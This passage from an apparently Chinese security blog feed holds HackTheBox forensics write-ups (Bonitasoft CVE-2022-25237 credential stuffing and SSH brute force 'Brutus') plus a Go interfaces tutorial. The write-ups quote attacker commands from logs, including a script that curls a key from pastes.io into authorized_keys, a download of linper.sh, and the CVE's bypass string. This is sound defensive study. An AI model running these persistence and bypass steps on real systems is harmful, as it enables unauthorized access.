&quot;install&quot;<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/df57b86c6dfdf705.png"></p><p>过滤出来了 59 条</p><p><img src="https://img.dkdun.cn/v1/2025/12/61058c99549a3883.png"></p><p>但是发现其中有四条是重复的，所以总共 56 条</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">How</span> many combinations of usernames <span class="hljs-keyword">and</span> passwords were used in the credential stuffing attack?<br>:<span class="hljs-number">56</span><br></code></pre></td></tr></table></figure><h1 id="Task-6"><a href="#Task-6" class="headerlink" title="Task 6"></a>Task 6</h1><p>查看会话信息能发现，用户 <code>seb.broom@forela.co.uk</code> 尝试登陆后状态码变成了 204 ，表名已经身份验证成功了</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">username</span>=seb.broom@forela.co.uk&amp;password=g0vernm3nt<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/85c6f2cc07e9613f.png"></p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-title class_">Which</span> username <span class="hljs-keyword">and</span> password combination was successful?<br><span class="hljs-symbol">:seb</span>.broom<span class="hljs-variable">@forela</span>.<span class="hljs-symbol">co.uk:</span>g0vernm3nt<br></code></pre></td></tr></table></figure><h1 id="Task-7"><a href="#Task-7" class="headerlink" title="Task 7"></a>Task 7</h1><p>结合前面的来看，这一段是在登录成功之后，然后进行了几个操作：</p><ul><li><p>上传 zip 文件利用了 CVE</p></li><li><p>执行 whoami</p></li><li><p>执行 cat &#x2F;etc&#x2F;passwd</p></li><li><p>删除上传的文件</p></li><li><p>利用 wget 下载文件</p></li></ul><p><img src="https://img.dkdun.cn/v1/2025/12/b4fbaa938f71fac0.png"></p><p><img src="https://img.dkdun.cn/v1/2025/12/37a99f2a47b58887.png"></p><p><img src="https://img.dkdun.cn/v1/2025/12/c0aca04cdf7ced22.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wget https://pastes.io/raw/bx5gcr0et8<br></code></pre></td></tr></table></figure><p>所以网站为 ：pastes.io</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">If <span class="hljs-keyword">any</span>, which <span class="hljs-keyword">text</span> sharing site did <span class="hljs-keyword">the</span> attacker utilise?<br>:pastes.io<br></code></pre></td></tr></table></figure><h1 id="Task-8"><a href="#Task-8" class="headerlink" title="Task 8"></a>Task 8</h1><p>同样尝试  wget 文件下来发现是一个脚本，用于 <code>curl</code> 读取另一个 <code>hffgra4unv</code> 文件，并将其写入 Ubuntu 的 <code>authorized_keys</code> 文件中</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br>curl https://pastes.io/raw/hffgra4unv &gt;&gt; /home/ubuntu/.ssh/authorized_keys<br><span class="hljs-built_in">sudo</span> service ssh restart<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/93e20f05d9fc32c4.png"></p><p>所以 <code>hffgra4unv</code> 文件中有公钥</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">Please provide <span class="hljs-keyword">the</span> filename <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> public key used <span class="hljs-keyword">by</span> <span class="hljs-keyword">the</span> attacker <span class="hljs-built_in">to</span> gain persistence <span class="hljs-keyword">on</span> <span class="hljs-title">our</span> <span class="hljs-title">host</span>.<br>:hffgra4unv<br></code></pre></td></tr></table></figure><h1 id="Task-9"><a href="#Task-9" class="headerlink" title="Task 9"></a>Task 9</h1><p>写入 <code>/home/ubuntu/.ssh/authorized_keys</code> 中</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-title class_">Can</span> you confirm the file modified by the attacker to gain persistence?<br><span class="hljs-symbol">:/home/ubuntu/</span>.ssh/authorized_keys<br></code></pre></td></tr></table></figure><h1 id="Task-10"><a href="#Task-10" class="headerlink" title="Task 10"></a>Task 10</h1><p>根据线索查找，持久性并且对账户操作，<a href="https://attack.mitre.org/techniques/T1098/004/">Account Manipulation: SSH Authorized Keys</a></p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ada">Can you confirm the MITRE technique ID <span class="hljs-keyword">of</span> this <span class="hljs-keyword">type</span> <span class="hljs-type">of </span>persistence mechanism?<br>:T1098.<span class="hljs-number">004</span><br></code></pre></td></tr></table></figure><h1 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h1><h2 id="jq"><a href="#jq" class="headerlink" title="jq"></a>jq</h2><p>jq 用于处理 JSON 输入，将给定过滤器应用于其 JSON 文本输入并在标准输出上将过滤器的结果生成为 JSON</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">-n, --null-input          使用 null 作为单一输入值；<br>-R, --raw-input           将每行输入视为原始字符串（而非JSON）；<br>-s, --slurp               将所有输入读取到一个数组中，并作为单一输入值；<br>-c, --compact-output      输出紧凑格式（而非美化格式）；<br>-r, --raw-output          直接输出字符串（不转义且不加引号）；<br>--raw-output0         同 -r，但每条输出后追加 NUL空字符；<br>-j, --join-output         同 -r，但输出后不换行；<br>-a, --ascii-output        仅用 ASCII 转义序列输出字符串；<br>-S, --sort-keys           输出时对每个对象的键排序；<br>-C, --color-output        彩色输出 JSON；<br>-M, --monochrome-output   禁用彩色输出；<br>--tab                 使用制表符缩进；<br>--indent n            使用 n 个空格缩进（最多7个）；<br>--unbuffered          每次输出后立即刷新输出流；<br>--stream              以流式处理方式解析输入值；<br>--stream-errors       同 --stream，并将解析错误报告为数组；<br>--<span class="hljs-built_in">seq</span>                 按 application/json-seq 格式解析输入/输出；<br></code></pre></td></tr></table></figure><p>详细教程：<a href="https://cn.linux-console.net/?p=11006">如何使用 jq 从 Linux 命令行解析 json 文件</a></p><h2 id="Credential-Stuffing"><a href="#Credential-Stuffing" class="headerlink" title="Credential Stuffing"></a>Credential Stuffing</h2><p>凭证填充，习惯性称为 “撞库”，就是利用从一项服务上的数据泄露中获得的登录凭据尝试登录到另一个不相关的服务，获取对其他服务上用户帐户的未授权访问。简单来说就是假如攻击者在一个服务上窃取了很多账号，然后使用相同的登录凭证去登录银行账户，猜测在银行也有这些账户使用同样的用户名和密码（因此不要所有的账户都用相同的密码hhhh）。利用的是数据泄露，所以大大提高了成功率。</p><h2 id="CVE-2022-25237"><a href="#CVE-2022-25237" class="headerlink" title="CVE-2022-25237"></a>CVE-2022-25237</h2><p>详细信息：<a href="https://rhinosecuritylabs.com/application-security/cve-2022-25237-bonitasoft-authorization-bypass/">CVE-2022-25237：Bonitasoft 授权绕过和 RCE</a></p><p>Bonita Web 2021.2 受到身份验证&#x2F;授权绕过漏洞的影响，原因是 <code>RestAPIAuthorizationFilter</code> 中使用的排除模式过于宽泛。通过在 <code>URL</code> 末尾附加 <code>;i18ntranslation</code> 或 <code>/../i18ntranslation/</code>，没有权限的用户可以访问特权 <code>API</code> 端点，这可能导致通过滥用特权 <code>API</code> 操作直接 RCE。</p><p>漏洞点来自系统中的  <code>web.xml</code> 文件，用于定义系统应用的路由和如何处理路由的身份验证及授权</p><h2 id="SSH-Authorized-Keys"><a href="#SSH-Authorized-Keys" class="headerlink" title="SSH Authorized Keys"></a>SSH Authorized Keys</h2><p>Linux 发行版和 macOS 通常使用基于密钥的身份验证来保护远程管理的 SSH 会话的身份验证过程。SSH <code>authorized_keys</code> 中的文件指定可用于登录配置文件所针对的用户帐户的 SSH 密钥。此文件通常位于用户主目录中的 下的 <code>&lt;user-home&gt;/.ssh/authorized_keys</code>。用户可以编辑系统的 SSH 配置文件，将指令 <code>PubkeyAuthentication</code> 和 <code>RSAAuthentication</code> 修改为值 “yes”，以确保启用公钥和 <code>RSA</code> 身份验证。SSH 配置文件通常位于 下<code>/etc/ssh/sshd_config</code>。</p><p>攻击者可以直接使用脚本或 shell 命令修改 SSH <code>authorized_keys</code> 文件，以添加攻击者提供的公钥。</p><p>当我们需要 ssh 远程访问服务器时，会生成 ssh 公钥，然后本地机器将公钥写入到服务器的 <code>.ssh/authorized_keys</code>中，实现免密登录连接。</p><h1 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h1><p>大致流程</p><ul><li>通过凭证填充的方式来对服务器进行请求</li><li>‘’<a href="mailto:&#x73;&#101;&#x62;&#x2e;&#x62;&#x72;&#111;&#x6f;&#x6d;&#x40;&#x66;&#111;&#114;&#x65;&#108;&#97;&#x2e;&#x63;&#111;&#x2e;&#x75;&#107;">&#x73;&#101;&#x62;&#x2e;&#x62;&#x72;&#111;&#x6f;&#x6d;&#x40;&#x66;&#111;&#114;&#x65;&#108;&#97;&#x2e;&#x63;&#111;&#x2e;&#x75;&#107;</a>:g0vernm3nt”成功登录</li><li>利用 CVE-2022-25237 来上传 <code>rce_api_extension.zip</code> 文件，然后再删除</li><li>通过脚本将新的 ssh 公钥覆盖写入 <code>/home/ubuntu/.ssh/authorized_keys</code> 中</li><li>ssh 连接下载了一些软件包</li><li>nmap 对 IP:34.207.150.13 进行端口枚举</li><li>结束 ssh 会话</li></ul><p><img src="https://img.dkdun.cn/v1/2025/12/e48656578bbfe459.png"></p><p>从 6385 开始就在对端口进行扫描，应该是打开了 nmap</p><p><img src="https://img.dkdun.cn/v1/2025/12/3da479c6bf97b741.png"></p><p>直到最后结束 ssh 会话</p>]]></content>
    
    
    <categories>
      
      <category>应急响应&amp;取证</category>
      
      <category>HTB</category>
      
    </categories>
    
    
    <tags>
      
      <tag>应急响应</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB-Brutus</title>
    <link href="/2025/03/24/HTB-Brutus/"/>
    <url>/2025/03/24/HTB-Brutus/</url>
    
    <content type="html"><![CDATA[<p>Intro to Blue Team </p><p>Level：Very Easy</p><span id="more"></span><h1 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h1><p>In this very easy Sherlock, you will familiarize yourself with Unix auth.log and wtmp logs. We’ll explore a scenario where a Confluence server was brute-forced via its SSH service. After gaining access to the server, the attacker performed additional activities, which we can track using auth.log. Although auth.log is primarily used for brute-force analysis, we will delve into the full potential of this artifact in our investigation, including aspects of privilege escalation, persistence, and even some visibility into command execution.</p><h1 id="Task-1"><a href="#Task-1" class="headerlink" title="Task 1"></a>Task 1</h1><p>打开 <code>auth.log</code> 查看（眼睛要虾了）</p><p><img src="https://img.dkdun.cn/v1/2025/12/75f9080b6ed8d64c.png"></p><p>日志格式</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">Timestamp</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">Hostname</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">Service</span>&gt;</span>[<span class="hljs-tag">&lt;<span class="hljs-name">process_id</span>&gt;</span>]: <span class="hljs-tag">&lt;<span class="hljs-name">Message</span>&gt;</span><br></code></pre></td></tr></table></figure><p>在日志中能发现一大段连续的  <code>Failed...</code>  字样的日志</p><p><img src="https://img.dkdun.cn/v1/2025/12/6f0ec98bdd474f43.png"></p><p>这种一般是在爆破了，所以 IP 为：65.2.161.68</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">Analyze <span class="hljs-keyword">the</span> auth.<span class="hljs-built_in">log</span>. What is <span class="hljs-keyword">the</span> IP address used <span class="hljs-keyword">by</span> <span class="hljs-keyword">the</span> attacker <span class="hljs-built_in">to</span> carry out <span class="hljs-keyword">a</span> brute force attack?<br>:<span class="hljs-number">65.2</span><span class="hljs-number">.161</span><span class="hljs-number">.68</span><br></code></pre></td></tr></table></figure><h1 id="Task-2"><a href="#Task-2" class="headerlink" title="Task 2"></a>Task 2</h1><p>在被爆破之后又在后面看到了登录成功记录</p><p><img src="https://img.dkdun.cn/v1/2025/12/4b5c9bdd99f1fd23.png"></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">The bruteforce attempts were successful <span class="hljs-keyword">and</span> attacker gained <span class="hljs-keyword">access</span> <span class="hljs-keyword">to</span> an account <span class="hljs-keyword">on</span> the <span class="hljs-keyword">server</span>. What <span class="hljs-keyword">is</span> the username <span class="hljs-keyword">of</span> the account?<br>:root<br></code></pre></td></tr></table></figure><h1 id="Task-3"><a href="#Task-3" class="headerlink" title="Task 3"></a>Task 3</h1><p>读取 <code>wtmp</code> 数据，找到 root 用户登录信息</p><p><img src="https://img.dkdun.cn/v1/2025/12/39b3938228f23bc3.png"></p><p><code>2024-03-06T06:32:45,387923+00:00</code> 也就是 <code>2024-03-06 06:32:45</code></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">Identify the <span class="hljs-type">timestamp</span> <span class="hljs-keyword">when</span> the attacker <span class="hljs-keyword">logged</span> <span class="hljs-keyword">in</span> manually <span class="hljs-keyword">to</span> the <span class="hljs-keyword">server</span> <span class="hljs-keyword">to</span> carry <span class="hljs-keyword">out</span> their objectives. The <span class="hljs-keyword">login</span> <span class="hljs-type">time</span> will be different than the authentication <span class="hljs-type">time</span>, <span class="hljs-keyword">and</span> can be <span class="hljs-built_in">found</span> <span class="hljs-keyword">in</span> the wtmp artifact.<br>:<span class="hljs-number">2024</span><span class="hljs-number">-03</span><span class="hljs-number">-06</span> <span class="hljs-number">06</span>:<span class="hljs-number">32</span>:<span class="hljs-number">45</span><br></code></pre></td></tr></table></figure><h1 id="Task-4"><a href="#Task-4" class="headerlink" title="Task 4"></a>Task 4</h1><p>查看和 <code>wtmp</code> 文件中登录时间一样的的，差了一秒钟但这是正常现象，因为验证 <code>/etc/shadow</code> 文件中的哈希和启动交互式会话都需要花费时间，所以答案就是 <code>06:32:44</code> 的信息，创建了 <code>New Session 37</code></p><p><img src="https://img.dkdun.cn/v1/2025/12/b02b710d73dcb1d9.png"></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">SSH <span class="hljs-keyword">login</span> sessions are tracked <span class="hljs-keyword">and</span> assigned a <span class="hljs-keyword">session</span> number upon <span class="hljs-keyword">login</span>. What <span class="hljs-keyword">is</span> the <span class="hljs-keyword">session</span> number assigned <span class="hljs-keyword">to</span> the attacker<span class="hljs-string">&#x27;s session for the user account from Question 2?</span><br><span class="hljs-string">:37</span><br></code></pre></td></tr></table></figure><h1 id="Task-5"><a href="#Task-5" class="headerlink" title="Task 5"></a>Task 5</h1><p>查找新的用户，那说明这个用户成功创建，在日志里发现 <code>cyberjunkie</code> 被添加到了 <code>sudo</code> 组中，并且有对 <code>/etc/shadow</code> 的访问权限</p><p><img src="https://img.dkdun.cn/v1/2025/12/b60aa9c7e4dce85a.png"></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">The attacker added a <span class="hljs-built_in">new</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">as</span> part <span class="hljs-keyword">of</span> their persistence strategy <span class="hljs-keyword">on</span> the <span class="hljs-keyword">server</span> <span class="hljs-keyword">and</span> gave this <span class="hljs-built_in">new</span> <span class="hljs-keyword">user</span> account higher <span class="hljs-keyword">privileges</span>. What <span class="hljs-keyword">is</span> the <span class="hljs-type">name</span> <span class="hljs-keyword">of</span> this account?<br>:cyberjunkie<br></code></pre></td></tr></table></figure><h1 id="Task-6"><a href="#Task-6" class="headerlink" title="Task 6"></a>Task 6</h1><p><a href="https://attack.mitre.org/techniques/T1136/">MITRE ATT&amp;CK</a></p><p>在网上搜到的：<a href="https://www.freebuf.com/articles/network/359282.html">ATT&amp;CK v10版本战术介绍—持久化（二）</a>，T1136</p><p>从日志来看，应该是使用的本地创建账户，ID 为 <code>T1136.001</code></p><p><img src="https://img.dkdun.cn/v1/2025/12/3b7f63d0c168e49c.png"></p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs smali">What is the MITRE ATT&amp;CK<span class="hljs-built_in"> sub-technique </span>ID used for persistence by creating a<span class="hljs-built_in"> new </span>account?<span class="hljs-keyword"></span><br><span class="hljs-keyword">:T1136</span>.001<br></code></pre></td></tr></table></figure><h1 id="Task-7"><a href="#Task-7" class="headerlink" title="Task 7"></a>Task 7</h1><p>可以看到 <code>session</code> 在 <code>06:37:24</code> 结束，所以答案为 <code>2024-03-06 06:37:24</code></p><p><img src="https://img.dkdun.cn/v1/2025/12/c203cf4f5fd6e666.png"></p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs applescript">What <span class="hljs-built_in">time</span> did <span class="hljs-keyword">the</span> attacker&#x27;s <span class="hljs-keyword">first</span> SSH session <span class="hljs-keyword">end</span> according <span class="hljs-keyword">to</span> auth.<span class="hljs-built_in">log</span>?<br>:<span class="hljs-number">2024</span><span class="hljs-number">-03</span><span class="hljs-number">-06</span> <span class="hljs-number">06</span>:<span class="hljs-number">37</span>:<span class="hljs-number">24</span><br></code></pre></td></tr></table></figure><h1 id="Task-8"><a href="#Task-8" class="headerlink" title="Task 8"></a>Task 8</h1><p>在日志结尾处能发现使用了 <code>curl </code>命令</p><p><img src="https://img.dkdun.cn/v1/2025/12/fa54c61ca2f90664.png"></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/curl https:/</span><span class="hljs-regexp">/raw.githubusercontent.com/m</span>ontysecurity<span class="hljs-regexp">/linper/m</span>ain/linper.sh<br></code></pre></td></tr></table></figure><p>可以看到下载了 <code>linper.sh</code></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-title class_">The</span> attacker logged into their backdoor account <span class="hljs-keyword">and</span> utilized their higher privileges to download a script. <span class="hljs-title class_">What</span> is the full command executed using sudo?<br><span class="hljs-symbol">:/usr/bin/curl</span> <span class="hljs-symbol">https:</span>/<span class="hljs-regexp">/raw.githubusercontent.com/montysecurity</span><span class="hljs-regexp">/linper/main</span><span class="hljs-regexp">/linper.sh</span><br></code></pre></td></tr></table></figure><h1 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h1><h2 id="auth-log"><a href="#auth-log" class="headerlink" title="auth.log"></a>auth.log</h2><p>Linux 中 <code>/var/log</code> 目录下的文件，记录所有与用户认证相关的日志，比如说 ssh </p><p>像 ssh 登录成功，查找相关日志可以过滤 <code>Accepted password</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Mar  6 06:19:54 ip-172-31-35-28 sshd[1465]: Accepted password <span class="hljs-keyword">for</span> root from 203.101.190.9 port 42825 ssh2<br></code></pre></td></tr></table></figure><p>ssh 登录失败，相关日志可以过滤 <code>Failed password</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Mar  6 06:31:33 ip-172-31-35-28 sshd[2334]: Failed password <span class="hljs-keyword">for</span> invalid user admin from 65.2.161.68 port 46454 ssh2<br></code></pre></td></tr></table></figure><p>爆破日志可以看是否有一段连续的登录请求</p><p>登录会话开始</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Mar  6 06:18:01 ip-172-31-35-28 CRON[1119]: pam_unix(cron:session): session opened <span class="hljs-keyword">for</span> user confluence(uid=998) by (uid=0)<br></code></pre></td></tr></table></figure><p>登录会话结束</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Mar  6 06:18:01 ip-172-31-35-28 CRON[1118]: pam_unix(cron:session): session closed <span class="hljs-keyword">for</span> user confluence<br></code></pre></td></tr></table></figure><h2 id="wtmp"><a href="#wtmp" class="headerlink" title="wtmp"></a>wtmp</h2><p>详细解释：<a href="https://linuxhandbook.com/utmp-wtmp-btmp/">https://linuxhandbook.com/utmp-wtmp-btmp/</a></p><p>Linux 中 <code>utmp</code> 、<code>wtmp</code>、<code>btmp</code> 文件都用于存储用户的登录信息，但每个文件都不一样，文件存储在 <code>/var/run</code> 和 <code>/var/log</code> 中</p><ul><li><p>utmp：跟踪当前登录的用户，默认由 <code>who</code> 和 <code>w</code> 显示当前登录用户的信息，<code>uptime</code> 记录系统启动时间。</p></li><li><p>wtmp：跟踪每次登录和历史登录系统的用户信息，默认由 <code>last</code> 命令查看。</p></li><li><p>btmp：记录失败的尝试登录信息，默认由 <code>lastb</code> 命令查看。</p></li></ul><p>题目中给出的 <code>wtmp</code> 文件，可以使用命令读取</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">utmpdump /var/log/wtmp<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>应急响应&amp;取证</category>
      
      <category>HTB</category>
      
    </categories>
    
    
    <tags>
      
      <tag>应急响应</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Re:从零开始的 Go 之旅- 基础(4)</title>
    <link href="/2025/03/23/Go-4/"/>
    <url>/2025/03/23/Go-4/</url>
    
    <content type="html"><![CDATA[<p>…ing</p><span id="more"></span><h1 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h1><p>接口只定义而不实现</p><h2 id="接口类型"><a href="#接口类型" class="headerlink" title="接口类型"></a>接口类型</h2><p>Go 中的接口（interface）是一种抽象的类型，interface 是一组方法的集合</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs go">Basic Interface:只要包含方法集的接口<br>General Interface:只要包含类型集的接口<br></code></pre></td></tr></table></figure><h2 id="接口声明"><a href="#接口声明" class="headerlink" title="接口声明"></a>接口声明</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> 接口类型名 <span class="hljs-keyword">interface</span>&#123;<br>    方法名<span class="hljs-number">1</span>( 参数列表<span class="hljs-number">1</span> ) 返回值列表<span class="hljs-number">1</span><br>    方法名<span class="hljs-number">2</span>( 参数列表<span class="hljs-number">2</span> ) 返回值列表<span class="hljs-number">2</span><br>     …<br>&#125;<br></code></pre></td></tr></table></figure><p>一个简单的例子，定义了 <code>Animal</code> 接口，<code>dog</code>  和 <code>cat</code>  结构体，实现 <code>Say()</code> 方法，实现该接口的实例</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Animal <span class="hljs-keyword">interface</span> &#123;<br>Say()<br>&#125;<br><span class="hljs-keyword">type</span> dog <span class="hljs-keyword">struct</span>&#123;&#125;<br><span class="hljs-keyword">type</span> cat <span class="hljs-keyword">struct</span>&#123;&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(d dog)</span></span> Say() &#123;<br>fmt.Println(<span class="hljs-string">&quot;www&quot;</span>)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(c cat)</span></span> Say() &#123;<br>fmt.Println(<span class="hljs-string">&quot;mmm&quot;</span>)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> hay Animal<br>a := cat&#123;&#125;<br>b := dog&#123;&#125;<br>hay = a<br>hay.Say()<br>hay = b<br>hay.Say()<br>&#125;<br><br>&gt;&gt;<br>mmm<br>www<br></code></pre></td></tr></table></figure><h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><p>方法集是接口方法的超集，实现方法不需要 <code>implements</code> 关键字指定实现，只要是实现了一个接口的全部方法，那就是实现了该接口，</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Person <span class="hljs-keyword">interface</span> &#123;<br>Say(<span class="hljs-type">string</span>) <span class="hljs-type">string</span><br>Walk(<span class="hljs-type">int</span>)<br>&#125;<br><br><span class="hljs-keyword">type</span> Man <span class="hljs-keyword">interface</span> &#123;<br>Exercise()<br>Person<br>&#125;<br><span class="hljs-keyword">type</span> Number <span class="hljs-type">int</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(n Number)</span></span> Say(s <span class="hljs-type">string</span>) <span class="hljs-type">string</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-string">&quot;bibibibibi&quot;</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(n Number)</span></span> Walk(i <span class="hljs-type">int</span>) &#123;<br>fmt.Println(<span class="hljs-string">&quot;can not walk&quot;</span>)<br>&#125;<br><br><span class="hljs-keyword">type</span> Func <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(f Func)</span></span> Say(s <span class="hljs-type">string</span>) <span class="hljs-type">string</span> &#123;<br>f()<br><span class="hljs-keyword">return</span> <span class="hljs-string">&quot;bibibibibi&quot;</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(f Func)</span></span> Walk(i <span class="hljs-type">int</span>) &#123;<br>f()<br>fmt.Println(<span class="hljs-string">&quot;can not walk&quot;</span>)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> function Func<br>function = <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;do somthing&quot;</span>)<br>&#125;<br>function()<br>&#125;<br>&gt;&gt;<br>do somthing<br></code></pre></td></tr></table></figure><p>上面这个例子中，<code>Man</code>  方法是 <code>Person</code> 方法的超集，所以 <code>Man</code> 也实现了接口 <code>Person</code>；类型 <code>Number</code> 是 <code>int</code> ，<code>Number</code> 方法也是 <code>Person</code> 的超集。函数类型也能实现接口。</p><h2 id="空接口"><a href="#空接口" class="headerlink" title="空接口"></a>空接口</h2><p>空接口是所有类型集的集合，包含所有类型</p><figure class="highlight go"><table><tr><td 